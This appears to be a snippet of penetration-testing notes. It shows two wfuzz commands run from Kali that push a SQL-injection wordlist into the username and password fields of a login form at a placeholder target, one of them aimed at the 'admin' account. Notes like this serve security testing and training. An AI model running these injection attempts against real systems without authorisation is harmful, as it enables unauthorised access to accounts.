```bash - kali
wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=FUZZ&password=FUZZ” -u $TARGET
```

```bash - kali
wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=admin&password=FUZZ” -u $TARGET
```

[[SQLText]]
